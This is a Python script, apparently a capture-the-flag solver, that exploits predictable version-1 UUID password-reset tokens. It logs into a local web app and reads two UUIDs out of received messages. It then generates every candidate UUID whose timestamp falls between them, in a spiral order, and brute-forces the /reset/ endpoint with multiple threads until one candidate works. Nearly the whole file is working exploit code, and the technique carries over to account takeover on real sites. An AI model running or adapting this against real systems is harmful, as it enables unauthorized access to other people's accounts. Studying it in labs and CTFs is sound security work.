#!/usr/bin/env python3
import uuid
import requests
import re
import queue
import threading
import time
from datetime import datetime, timezone
from zoneinfo import ZoneInfo
from concurrent.futures import ThreadPoolExecutor

# ---------------- CONFIG ----------------
BASE_URL = "http://127.0.0.1:5000"
ASSUME_TZ = ZoneInfo("Europe/Paris")

CONCURRENCY = 6          # worker threads
RATE_PER_WORKER = 10     # req/sec per worker
REQUEST_TIMEOUT = 2.0

LOGIN_PAYLOAD = {"name": "solve", "password": "solve"}

UUID_EPOCH_OFFSET = 12219292800  # sec between 1582-10-15 and 1970-01-01

# ---------------- UUID UTILITIES ----------------
def uuid1_timestamp(u: uuid.UUID) -> int:
    return ((u.time_hi_version & 0x0FFF) << 48) | (u.time_mid << 32) | u.time_low

def uuid1_from_components(timestamp: int, node: int, clock_seq: int=0) -> uuid.UUID:
    time_low = timestamp & 0xFFFFFFFF
    time_mid = (timestamp >> 32) & 0xFFFF
    time_hi_version = ((timestamp >> 48) & 0x0FFF) | (1 << 12)
    clock_seq_hi_variant = ((clock_seq >> 8) & 0x3F) | 0x80
    clock_seq_low = clock_seq & 0xFF
    return uuid.UUID(fields=(time_low, time_mid, time_hi_version,
                             clock_seq_hi_variant, clock_seq_low, node), version=1)

# ---------------- SPIRAL GENERATOR ----------------
def spiral_search_between(uuid_start, uuid_end):
    ts_start = uuid1_timestamp(uuid_start)
    ts_end = uuid1_timestamp(uuid_end)
    if ts_start > ts_end:
        ts_start, ts_end = ts_end, ts_start
    center_ts = (ts_start + ts_end) // 2
    radius = 0
    while True:
        candidates = []
        if center_ts + radius < ts_end:
            candidates.append(center_ts + radius)
        if radius != 0 and center_ts - radius > ts_start:
            candidates.append(center_ts - radius)
        if not candidates:
            break
        for ts in candidates:
            yield ts
        radius += 1

def generate_uuids_between_spiral(uuid_start, uuid_end, clock_seq=0):
    node = uuid_start.node
    for ts in spiral_search_between(uuid_start, uuid_end):
        yield uuid1_from_components(ts, node, clock_seq)

# ---------------- NETWORK HELPERS ----------------
def make_worker_session_from(main_session: requests.Session) -> requests.Session:
    s = requests.Session()
    s.cookies.update(main_session.cookies.get_dict())
    s.headers.update(main_session.headers)
    adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s

def worker_thread(worker_id: int, sess: requests.Session, q: queue.Queue, stop_event: threading.Event,
                  found_container: dict, attempts_counter: list, rate_per_sec: float):
    sleep_interval = 1.0 / rate_per_sec if rate_per_sec > 0 else 0
    url_template = BASE_URL.rstrip('/') + "/reset/{}"
    while not stop_event.is_set():
        try:
            u_obj = q.get_nowait()
        except queue.Empty:
            return

        # double-check stop_event
        if stop_event.is_set():
            q.task_done()
            return

        url = url_template.format(str(u_obj))
        try:
            if stop_event.is_set():
                q.task_done()
                return

            r = sess.get(url, allow_redirects=False, timeout=REQUEST_TIMEOUT)
            attempts_counter[0] += 1
            if r.status_code != 302:
                found_container['uuid'] = str(u_obj)
                found_container['status'] = r.status_code
                stop_event.set()
                q.task_done()
                print(">>> UUID trouvé immédiatement :", found_container.get('uuid'),
                          "status:", found_container.get('status'))
                return
        except Exception as e:
            print(f"[worker {worker_id}] HTTP error on {u_obj}: {e}")
        finally:
            try:
                q.task_done()
            except Exception:
                pass

        if sleep_interval:
            time.sleep(sleep_interval)

# ---------------- MAIN FLOW ----------------
def main_flow():
    main_sess = requests.Session()
    main_sess.headers.update({"User-Agent": "ctf-tester/1.0"})
    r = main_sess.post(BASE_URL + "/login", data=LOGIN_PAYLOAD, allow_redirects=False, timeout=REQUEST_TIMEOUT)
    if r.status_code not in (200, 302, 303):
        print("Login failed:", r.status_code)
        return

    messages = main_sess.get(BASE_URL + "/api/received_messages", timeout=REQUEST_TIMEOUT).json()
    if len(messages) < 2:
        print("Not enough messages returned by API.")
        return

    def find_first_uuid_in(msg):
        text = msg.get('content','') if isinstance(msg, dict) else str(msg)
        m = re.search(r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}', text)
        return uuid.UUID(m.group()) if m else None

    extracted = []
    for msg in messages:
        u = find_first_uuid_in(msg)
        if u:
            extracted.append(u)
        if len(extracted) >= 2:
            break

    if len(extracted) < 2:
        print("Could not extract two UUIDs from messages.")
        return

    uuid_newer, uuid_older = extracted[0], extracted[1]
    print("UUID newer:", uuid_newer)
    print("UUID older:", uuid_older)

    candidates_gen = generate_uuids_between_spiral(uuid_older, uuid_newer, clock_seq=0)
    q = queue.Queue()
    for u in candidates_gen:
        q.put(u)
    print("Prepared", q.qsize(), "candidates (spiral-centered)")

    stop_event = threading.Event()
    found_container = {}
    attempts_counter = [0]

    with ThreadPoolExecutor(max_workers=CONCURRENCY) as exe:
        futures = []
        for i in range(CONCURRENCY):
            worker_sess = make_worker_session_from(main_sess)
            fut = exe.submit(worker_thread, i, worker_sess, q, stop_event, found_container, attempts_counter, RATE_PER_WORKER)
            futures.append(fut)

        try:
            while any(not f.done() for f in futures):
                print(f"Progress: queue={q.qsize()}, attempts={attempts_counter[0]}")
                if stop_event.is_set():
                    # Affichage immédiat dès qu'un UUID valide est trouvé
                    print(">>> UUID trouvé immédiatement :", found_container.get('uuid'),
                          "status:", found_container.get('status'))
                    # vider la queue pour arrêter rapidement les threads
                    while not q.empty():
                        try:
                            q.get_nowait()
                            q.task_done()
                        except queue.Empty:
                            break
                    break
                time.sleep(1.0)
        except KeyboardInterrupt:
            print("Interrupted by user, requesting stop...")
            stop_event.set()

        q.join()

    if 'uuid' in found_container:
        print("FINAL UUID trouvé :", found_container['uuid'], "status:", found_container['status'])
        print("Total attempts:", attempts_counter[0])
    else:
        print("Aucun UUID valide trouvé dans la fenêtre de recherche.")
        print("Total attempts:", attempts_counter[0])

if __name__ == "__main__":
    main_flow()
